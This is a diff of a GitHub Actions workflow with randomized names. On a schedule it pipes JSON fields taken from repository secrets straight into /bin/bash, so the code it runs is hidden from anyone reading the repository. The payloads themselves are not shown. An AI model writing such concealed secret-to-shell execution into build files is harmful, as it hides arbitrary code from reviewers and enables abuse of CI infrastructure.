@@ -3,7 +3,7 @@ name: bowallow
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 4/6 * * *'
+    - cron: '43 5/6 * * *'
 
 jobs:
   build:
@@ -13,13 +13,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: bowallow
         env:
-          wxie53: ${{ secrets.wxie53 }}
+          iixg6: ${{ secrets.iixg6 }}
         run: |
-          echo $wxie53 | jq -r .i28807 | /bin/bash
-          echo $wiz4628 | jq -r .ncmz48882 | /bin/bash
-          echo $bk87 | jq -r .o7 | /bin/bash
-          echo $vls88 | jq -r .txg50780 | /bin/bash
-          echo $ilix06 | jq -r .grt9100 | /bin/bash
-          echo $lq1019 | jq -r .wmyoc514 | /bin/bash
-          echo $lncwd168 | jq -r .rqpnq50 | /bin/bash
+          echo $iixg6 | jq -r .gd6140 | /bin/bash
+          echo $ovoka4 | jq -r .psn2236 | /bin/bash
+          echo $ngb5986 | jq -r .hybn6 | /bin/bash
 
